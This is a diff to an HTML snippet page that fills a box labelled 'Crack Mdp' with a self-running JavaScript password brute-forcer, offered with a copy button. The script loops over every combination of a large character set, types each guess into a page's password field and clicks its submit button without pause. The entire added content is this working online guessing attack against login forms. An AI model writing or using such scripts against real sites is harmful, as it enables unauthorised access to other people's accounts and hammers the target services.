@@ -86,7 +86,48 @@ document.addEventListener('keydown', (e) => {
 
     <div class="box">
       <h2>Crack Mdp</h2>
-      <p class="content">Voici du texte dans la deuxième fenêtre.</p>
+      <p class="content">(function() {
+    let cla = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','&','é','"','\'','(',')','-','è','_','ç','à',')','=','^','$','*','ù','%','¨','£','!','?',';',',',':','/','.','+','-','*','/','<','>','=','@','#','[',']','{','}','\\','|','`','~','^','€','µ','à','â','ç','é','è','î','ù','û','À','É','å'];
+
+    let estEnMarche = true;
+    let inputField = document.getElementById("mdpInput");
+    let submitBtn = document.getElementById("boutonMDP");
+
+    if (!inputField || !submitBtn) {
+        console.error("IDs introuvables !");
+        return;
+    }
+
+    let saisie = prompt("Quelle longueur de mot de passe tester ? (Annuler = 10)");
+    let tailleUnique = parseInt(saisie) || 10;
+
+    document.addEventListener('keydown', (e) => { if(e.key === 'Escape') estEnMarche = false; });
+
+    console.log("Démarrage ultra-rapide pour une longueur de : " + tailleUnique);
+    
+    let compteurs = new Array(tailleUnique).fill(0);
+    
+    // Boucle synchrone sans aucune pause
+    while (estEnMarche) {
+        let testMDP = compteurs.map(i => cla[i]).join('');
+        
+        inputField.value = testMDP;
+        submitBtn.click();
+
+        // Incrémentation
+        let i = 0;
+        while (i < tailleUnique && ++compteurs[i] >= cla.length) {
+            compteurs[i] = 0;
+            i++;
+        }
+        
+        // Arrêt si toutes les combinaisons sont faites
+        if (i === tailleUnique) {
+            console.log("Terminé.");
+            break; 
+        }
+    }
+})();</p>
       <button onclick="copyText(this)">Copier</button>
     </div>
 
